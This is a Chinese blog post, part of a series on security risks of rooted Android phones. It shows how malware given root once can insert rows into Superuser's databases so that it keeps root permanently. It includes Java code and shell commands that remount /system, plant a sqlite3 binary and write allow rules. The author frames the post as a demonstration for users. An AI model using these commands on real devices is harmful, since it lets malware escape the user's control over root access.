@@ -1,0 +1,376 @@
+
+首页资讯精华论坛问答博客专栏群组更多 ▼
+
+ 
+您还未登录 !登录注册
+
+
+
+
+su1216
+
+
+博客
+微博
+相册
+收藏
+留言
+关于我
+
+
+
+
+.
+
+
+
+
+android手机root后的安全问题 （三）
+博客分类： android
+ 
+androidrootsuperuser病毒危害 .
+
+
+导读：本文介绍病毒如何篡改superuser，使得用户只是允许病毒请求的一次root权限变成允许病毒永久使用root权限。
+ 
+ 
+ 
+ 
+ 
+继续之前两篇文章写，如果路过的同学有疑问，请先看前两篇
+ 
+有同学说，你的Fake.apk需要把应用copy到system下才行，这是需要root权限的。如果用户允许了你一次root请求，你当着用户的面copy，那么copy之后，系统会发送广播，告知有新的apk被安装，杀毒软件就会发现你。
+ 
+是的，这确实是个问题，但是病毒就是病毒，总会想办法让你病倒的，别急。
+ 
+ 
+ 
+superuser把数据记录到数据库中，那病毒为什么不去修改你的数据库呢？如果修改成功，那么岂不是永久获得了root权限，以后再也用不着你来批准我了，我自己批准！
+ 
+ 
+ 
+很不幸，病毒如果获得了一次root权限，那么上面所说的事情是完全可以做到的。
+ 
+我们来演示一下，我手机中装有superuser，版本为3.0.7
+ 
+我还装了一个re管理器
+ 
+ 
+ 
+首先，我们打开re管理器，这时候re管理器请求使用root权限，superuser会弹出提示，询问用户是否允许
+ 
+我们点击允许之前，勾选“记住”，然后允许。
+ 
+这一步是为了获取：应用获得永久root权限时，应该在superuser数据库插入什么样的数据。
+ 
+ 
+ 
+然后我们将数据库导出
+ 
+/data/data/com.noshufou.android.su/databases下面有两个数据库我们需要关注
+ 
+su.db
+ 
+permissions.sqlite
+ 
+我们以permissions.sqlite为例，下图为表结构：
+
+ 
+ 
+ 
+然后来看看病毒应该如何修改数据
+ 
+
+
+病毒只需要关心几个字段
+ 
+uid，包名，应用名，exec_uid=0，exec_cmd=/system/bin/sh，allow=1
+ 
+病毒如何获得自己的包名和应用名，这个大家没什么疑问吧
+ 
+ActivityManager.RunningAppProcessInfo中含有uid的信息
+ 
+下面的代码可以获得当前应用的uid
+ 
+
+
+Java代码  
+1.public static int getUid(Context context,String packageName){  
+2.    ActivityManager activityManager = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);  
+3.    List<ActivityManager.RunningAppProcessInfo> runningAppProcesses = activityManager.getRunningAppProcesses();  
+4.    int size = runningAppProcesses.size();  
+5.    ActivityManager.RunningAppProcessInfo runningAppProcessInfo = null;  
+6.    for (int i = 0; i < size; i++) {  
+7.        runningAppProcessInfo = runningAppProcesses.get(i);  
+8.        if(packageName.equals(runningAppProcessInfo.processName)){  
+9.            return runningAppProcessInfo.uid;  
+10.        }  
+11.    }  
+12.    return -1;  
+13.}  
+ 
+好了，这个表已经搞定了，su.db和这个几乎一样，也就不再演示了。
+ 
+ 
+ 
+最后的问题是，如何修改手机中的数据库，显然，我们使用sqlite3，但是有的手机居然没有这个问题，所以病毒很可能自己捆绑了一个，然后复制到system/bin或者system/xbin中
+ 
+sqlite3从哪来？哪都有。。比如你可以从模拟器pull出来一份。
+ 
+ 
+ 
+好了，全部搞定了
+ 
+最终我们分两步
+ 
+1准备sqlite3这个文件，以防万一
+ 
+
+
+Java代码  
+1.prepareButton.setOnClickListener(new View.OnClickListener() {  
+2.    public void onClick(View v) {  
+3.        File dataFolder = getFilesDir();  
+4.    File sqlite = new File(dataFolder.getAbsolutePath() + "/sqlite3");  
+5.    copyFile("db/sqlite3", sqlite, mResources);  
+6.    }  
+7.});  
+ 
+2申请root权限，一旦成功，那就修改数据库
+ 
+
+
+Java代码  
+1.String sqlUpdateSu = "insert into apps (uid,package,name,exec_uid,exec_cmd,allow,dirty)" +  
+2.                            "values (\""+ uid + "\",\"" + packageName + "\",\"" + name + "\",0,\"/system/bin/sh\",1,0) ";  
+3.String sqlInsertPermissions = "insert into apps (uid,package,name,exec_uid,exec_cmd,allow) " +  
+4.                                                    "values (\""+ uid + "\",\"" + packageName + "\",\"" + name + "\",\"0\",\"/system/bin/sh\",\"1\") ";  
+5.  
+6.String[] commands = {"busybox mount -o remount,rw /system"  
+7.                            ,"ls /system/bin/sqlite3 || ls /system/xbin/sqlite3 || busybox cp /data/data/" + packageName + "/files/sqlite3 /system/xbin/sqlite3 && chmod 777 /system/xbin/sqlite3"  
+8.                    ,"busybox rm /data/data/" + packageName + "/files/sqlite3"  
+9.                    ,"sqlite3 /data/data/com.noshufou.android.su/databases/su.db '" + sqlUpdateSu + "'"  
+10.                    ,"sqlite3 /data/data/com.noshufou.android.su/databases/permissions.sqlite '" + sqlInsertPermissions + "' "};  
+ 
+执行即可
+ 
+ 
+ 
+从此，病毒就脱离你的掌控了，一发不可收拾
+ 
+ 
+ 
+ 
+ 
+结语
+ 
+由于本博客只是用于演示，所以有些不严密的地方。
+ 
+比如：首次使用superuser之前，它的数据库的表可能还没有创建，所以有些sql操作可能会失败
+ 
+我也不打算写个完整的病毒，这样一些人就会想着干一些不干净的事情。仅供学习交流
+ 
+ 
+ 
+看来大家每次批准root之后，还要去superuser中的列表看看有没有什么异常才行
+ 
+ 
+ 
+请大家不要用root的手机随意下载软件，更不要以任何借口制造任何病毒！
+ 
+ 
+ 
+
+
+android手机root后的安全问题 （一）
+ 
+android手机root后的安全问题 （二）
+ 
+android手机root后的安全问题 （三）
+ 
+android手机root后的安全问题 （四）
+ 
+ 
+ 
+ 
+ 
+android安全问题（一） 静音拍照与被拍
+ 
+android安全问题（二） 程序锁
+ 
+android安全问题（三） 钓鱼程序
+ 
+ 
+
+ 
+ 
+ 
+ 
+转贴请保留以下链接
+ 
+本人blog地址
+ 
+http://su1216.iteye.com/
+ 
+http://blog.csdn.net/su1216/
+ 
+ 
+
+
+
+
+
+查看图片附件
+
+
+
+2 
+顶
+
+3 
+踩.
+
+分享到： 
+.
+
+android - 为安全而设计 - 1 - 开发文档翻 ... | android手机root后的安全问题 （二）
+
+2012-09-04 13:57
+浏览 1905
+评论(4)
+分类:移动开发
+相关推荐
+
+
+评论
+
+
+4 楼 su1216 2013-01-04   
+
+
+tjwink 写道
+
+既然已经知道su的数据库地址，可以直接用DBOpenHelper来打开这个数据库吗？
+
+DBOpenHelper不能指定其他应用下的数据库吧 
+
+3 楼 tjwink 2013-01-04   
+
+既然已经知道su的数据库地址，可以直接用DBOpenHelper来打开这个数据库吗？
+ 
+
+2 楼 su1216 2012-09-05   
+
+
+zuoshu 写道
+
+呵呵，写的不错。请教下LZ现在从事哪方面的工作阿？
+
+
+android系统移植，app开发维护 
+
+1 楼 zuoshu 2012-09-05   
+
+呵呵，写的不错。请教下LZ现在从事哪方面的工作阿？
+ 
+
+发表评论
+
+ 您还没有登录,请您登录后再发表评论 
+
+
+
+
+
+
+su1216
+ 
+浏览: 65623 次
+性别: 
+来自: 北京
+
+
+
+最近访客 更多访客>>
+
+
+
+
+rimoer
+
+
+
+
+zht19880706
+
+
+
+
+heavensay
+
+
+
+
+woyaowenzi
+.
+
+博客专栏
+深入入门正则表达式（jav...
+浏览量：6019.android手机的安全问...
+浏览量：18362.
+
+文章分类
+■全部博客 (93)
+■android (37)
+■Unix & Linux 大学教程 (22)
+■Linux命令行与shell脚本编程大全 (10)
+■java (5)
+■java多线程 (3)
+■虚拟机 (7)
+■设计模式 (1)
+■正则表达式 (6)
+■数据库 (1)
+■其他 (1)
+■转贴 (1)
+
+
+社区版块
+■我的资讯 (0)
+■我的论坛 (70) 
+■我的问答 (19)
+
+
+存档分类
+■2013-02 (1)
+■2013-01 (5)
+■2012-12 (7)
+■更多存档...
+
+
+评论排行榜
+■android手机root后的安全问题 （二）
+■android安全问题（二） 程序锁
+■android安全问题（四） 抢先开机启动 - ...
+■android安全问题（三） 钓鱼程序
+■android手机root后的安全问题 （一）
+
+
+最新评论
+N_HH： su1216 写道N_HH 写道那个，请问，pm是什么。。不懂 ...
+android手机root后的安全问题 （四）
+su1216： N_HH 写道那个，请问，pm是什么。。不懂。shell@an ...
+android手机root后的安全问题 （四）
+N_HH： 那个，请问，pm是什么。。不懂。
+android手机root后的安全问题 （四）
+su1216： tjwink 写道既然已经知道su的数据库地址，可以直接用DB ...
+android手机root后的安全问题 （三）
+tjwink： 既然已经知道su的数据库地址，可以直接用DBOpenHelpe ...
+android手机root后的安全问题 （三）
+
+.
+
+
+--------------------------------------------------------------------------------
+声明：ITeye文章版权属于作者，受法律保护。没有作者书面许可不得转载。若作者同意转载，必须以超链接形式标明文章原始出处和作者。
+© 2003-2012 ITeye.com. All rights reserved. [ 京ICP证110151号 京公网安备110105010620 ] 
+.
